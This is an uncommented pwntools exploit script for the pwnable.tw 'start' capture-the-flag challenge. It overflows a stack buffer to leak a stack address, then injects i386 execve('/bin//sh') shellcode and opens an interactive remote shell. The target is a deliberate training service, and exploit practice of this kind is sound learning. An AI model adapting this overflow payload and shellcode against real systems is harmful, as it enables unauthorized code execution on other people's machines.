from pwn import *
import struct
context.arch= 'i386'   


#p = process("./start")

p = remote('chall.pwnable.tw', 10000)
target = 0x08048087

payload =flat(["A"*20,p32(target)])

p.recvuntil("CTF:")

p.send(payload)
leak_addr = p.recv()
leak_addr = u32(leak_addr[:4])

shellcode = b""
shellcode+= b"\x31\xc9"            
shellcode+= b"\xf7\xe1"            
shellcode+= b"\x51"                
shellcode+= b"\x68\x2f\x2f\x73\x68"
shellcode+= b"\x68\x2f\x62\x69\x6e"
shellcode+= b"\x89\xe3"             
shellcode+= b"\xb0\x0b"             
shellcode+= b"\xcd\x80"             

payload  = flat(["A"*20,  p32(leak_addr+20), shellcode])
p.send(payload)

p.interactive()
